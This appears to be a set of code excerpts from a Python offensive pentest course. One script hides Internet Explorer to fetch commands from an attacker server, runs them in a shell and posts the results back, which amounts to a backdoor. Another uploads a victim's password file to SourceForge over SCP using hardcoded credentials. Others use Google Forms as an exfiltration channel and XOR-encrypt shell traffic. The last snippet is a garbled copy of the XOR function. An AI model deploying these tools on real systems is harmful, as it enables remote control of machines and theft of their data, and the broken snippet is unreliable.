["```\n# Python For Offensive PenTest\n\n# Install Python for Windows pywin32-219.win32-py2.7\n# http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/\n\n# Hijacking IE - Shell Over IE\n\nfrom win32com.client import Dispatch\nfrom time import sleep\nimport subprocess\n\nie = Dispatch(\"InternetExplorer.Application\") # Create browser instance.\nie.Visible = 0 # Make it invisible [ run in background ] (1= invisible)\n...\n```", "```\n...\n# Paramaeters for POST\ndURL = \"http://10.10.10.100\"\nFlags = 0\nTargetFrame = \"\"\n\nwhile True:\n\n    ie.Navigate(\"http://10.0.10.100\") # Navigate to our kali web server to grab the hacker commands\n\n    while ie.ReadyState != 4: # Wait for browser to finish loading.\n        sleep(1)\n\n    command = ie.Document.body.innerHTML\n\n    command = unicode(command) # Converts HTML entities to unicode. For example '&amp;' becomes '&'\n    command = command.encode('ascii','ignore') # encode the command into ASCII string and ignore any exception\n    print ' [+] We received command ' + command\n\n    if 'terminate' in command: # if the received command was terminate\n        ie.Quit() # quit the IE and end up the process \n        break # end the loop\n\n    else: # if the received command was NOT terminate then we inject the command into a shell and store the result in a variable called Data\n        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n\n        Data = CMD.stdout.read()\n        PostData = buffer( Data ) # in order to submit or post data using COM technique , it requires to buffer the data first\n                                  # https://docs.python.org/2/library/functions.html#buffer\n        ie.Navigate( dURL, Flags, TargetFrame, PostData ) # we post the comamnd execution result along with the post parameters which we defined earlier..\n\n    sleep(3)\n```", "```\ndir\ncd\nwhoami\narp -a\nping 10.10.10.100\n```", "```\n[+] We received command ipconfig\n[+] We received command dir\n[+] We received command cd\n[+] We received command whoami\n[+] We received command arp -a\n[+] We received command ping 10.10.10.100\n```", "```\n# Python For Offensive PenTest\n\n# Interacting with SourceForge\n\nimport paramiko # pip install paramiko\nimport scp # download link: https://pypi.python.org/pypi/scp\n...\n```", "```\npip install paramiko\n```", "```\n...\nssh_client = paramiko.SSHClient() # creating an ssh_client instance using paramiko sshclient class\n\n'''\nwhen you connect to an ssh server at the first time, if the ssh server keys are not stores on the client side, you will get a warning\nmessage syaing that the server keys are not chached in the system and will prompt whether you want to accept those keys.\n\nsince we do an automation on the target side, we inform paramiko to accept these keys for the first time without interrupting the session or\nprompting the user and this done via > set_missing_host_key_policy(paramiko.AutoAddPolicy()\n'''\n\nssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\nssh_client.connect(\"web.sourceforge.net\", username=\"hkhrais\", password=\"[123justyouandme]\") #Authenticate ourselves to the sourceforge server\nprint '[+] Authenticating against web.sourceforge.net ...' #please use your own login credentials :D\n\nscp = scp.SCPClient(ssh_client.get_transport()) #after a successful authentication the ssh session id will be passed into SCPClient function\n\nscp.put('C:/Users/Hussam/Desktop/password.txt') # upload to file( in this case it's password.txt) that we want to grab from the target to /root directory\nprint '[+] File is uploaded '\n\nscp.close()\nprint '[+] Closing the socket'\n```", "```\n>>>\n[+] Authenticating against web.sourceforge.net ...\n[+] File is uploaded\n[+] Closing the socket\n>>>\n```", "```\napt-get install filezilla \n```", "```\n'''\nCaution\n--------\nUsing this script for any malicious purpose is prohibited and against the law. Please read Google terms and conditions carefully. \nUse it on your own risk. \n'''\n\n# Python For Offensive PenTest\n\n# Interacting with Google Forms\n\nimport requests # To install requests library, just type on the CMD: pip install requests\n\nurl = 'https://docs.google.com/forms/d/e/1FAIpQLSdNHreWMKC4li3a-Ox7IzQZ9mkZjI94I8U6jz8yHBkePXSPoA/formResponse' # please replace the URL with your own google form :D\n\n'''\nnotice that i added /formResponse to the end of the URL and this is inherited from the page HTML source code,\nas we can see below, the HTML form action contains /formResponse when method POST is used to send the user data\nso we have to add this part when we automate the data submission\n<div class=\"ss-form\"><form action=\"https://docs.google.com/forms/d/1Ndjnm5YViqIYXyIuoTHsCqW_YfGa-vaaKEahY2cc5cs/formResponse?pli=1\"\nmethod=\"POST\" id=\"ss-form\" target=\"_self\" onsubmit=\"\"><ol role=\"list\" class=\"ss-question-list\" style=\"padding-left: 0\">\n'''\n\nform_data = {'entry.1542374001':'Hello from Python'}\n\nr = requests.post(url, data=form_data)\n# Submitting form-encoded data in requests:-\n# http://docs.python-requests.org/en/latest/user/quickstart/#more-complicated-post-requests\n```", "```\n...\nurl = 'https://docs.google.com/forms/d/e/1FAIpQLSdNHreWMKC4li3a-Ox7IzQZ9mkZjI94I8U6jz8yHBkePXSPoA/formResponse'\n...\nform_data = {'entry.1542374001':'Hello from Python'}\n...\n```", "```\n# Python For Offensive PenTest\n\nimport string # The random and string libraries are used to generate a random string with flexible criteria\nimport random\n\n# XOR Encryption\n\n# Random Key Generator\n\nkey = ''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits + '^!\\$%&/()=?{[]}+~#-_.:,;<>|\\\\') for _ in range(1024))\n\n# the for loop defines the key size, key size is 1 KB which if you remember in our TCP shell, it matches the TCP socket size :)\n# the \"\".join will put the result for the random strings into a sequence and we finally will store it in a key variable \n# so all in all the for loop will generate a 1024 random string which are matching our criteria and . join is used to gather these strings into a sequence\n\nprint key\nprint '\\n' + 'Key length = ' + str ( len(key) )\n\n# After we generate the XOR key, you need to take into consideration the XOR encryption rule which says the key length must be greater or equal the msg/data\n# which we will send over the tunnel. len(key) >= len(message) \n\nmessage = 'ipconfig' # this is the message which we will encrypt before it's getting sent\nprint \"Msg is \" + message + '\\n'\n...\n```", "```\n...\n# here i defined a dedicated function called str_xor, we will pass two values to this function, the first value is the message(s1) that we want to encrypt or decrypt, \n# and the second parameter is the xor key(s2). We were able to bind the encryption and the decryption phases in one function because the xor operation is exactly the\n# same when we encrypt or decrypt, the only difference is that when we encrypt we pass the message in clear text and when we want to decrypt we pass the encrypted message\n\ndef str_xor(s1, s2):\n return \"\".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])\n\n# first we split the message and the xor key to a list of character pair in tuples format >> for (c1,c2) in zip(s1,s2)\n\n# next we will go through each tuple, and converting them to integer using (ord) function, once they converted into integers we can now \n# perform exclusive OR on them >> ord(c1) ^ ord(c2)\n\n# then convert the result back to ASCII using (chr) function >> chr(ord(c1) ^ ord(c2))\n# last step we will merge the resulting array of characters as a sequence string using >>> \"\".join function \n\n#Here we do a quick test \n\nenc = str_xor(message, key)\nprint 'Encrypted message is: ' + '\\n' + enc + '\\n' \n\ndec = str_xor(enc, key)\nprint 'Decrypted message is: ' + '\\n' + dec\n\n#Make sure that the SAME Key is HARDCODED in the Server AND client, otherwise you won't be able to decode your own messages!\n```", "```\n...\nreturn \"\".json([chr{ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])\n...\n```"]